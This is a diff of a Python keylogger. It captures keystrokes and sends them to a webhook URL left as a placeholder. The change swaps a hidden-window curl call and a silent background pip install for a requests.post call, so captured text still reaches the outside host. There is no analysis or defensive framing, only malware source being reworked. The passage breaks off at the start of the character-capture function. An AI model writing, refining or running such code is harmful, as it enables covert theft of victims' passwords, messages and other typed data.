@@ -1,17 +1,9 @@
 import subprocess
 import time as t
+import keyboard
+import requests
 import json
 import sys
-
-
-try:
-    import keyboard
-except ImportError:
-    subprocess.run(
-        [sys.executable, '-m', 'pip', 'install', 'keyboard'],
-        creationflags=subprocess.CREATE_NO_WINDOW
-    )
-    import keyboard
 
 # Setup
 webhook_url = 'Webhook_URL_Here'
@@ -20,6 +12,7 @@ message_count = 0
 last_time = 60
 message_log = []
 
+
 def send_data(data):
     global message_count
     removed = data.replace('`', "'")  # avoid breaking code blocks
@@ -27,23 +20,13 @@ def send_data(data):
     message_log.append(message)
 
     if message_count < 25:
-
         payload = json.dumps({"content": message_log[0]})
 
-        curl_command = [
-            "curl",
-            "-X", "POST",
-            "-H", "Content-Type: application/json",
-            "-d", payload,
-            webhook_url
-        ]
-
         try:
-            result = subprocess.run(
-                curl_command,
-                capture_output=True,
-                text=True,
-                creationflags=subprocess.CREATE_NO_WINDOW
+            response = requests.post(
+                webhook_url,
+                headers={"Content-Type": "application/json"},
+                data=payload
             )
             message_count += 1
             del message_log[0]
@@ -51,6 +34,7 @@ def send_data(data):
             pass
     else:
         message_log.append(message)
+
 
 
 def add_character(character):
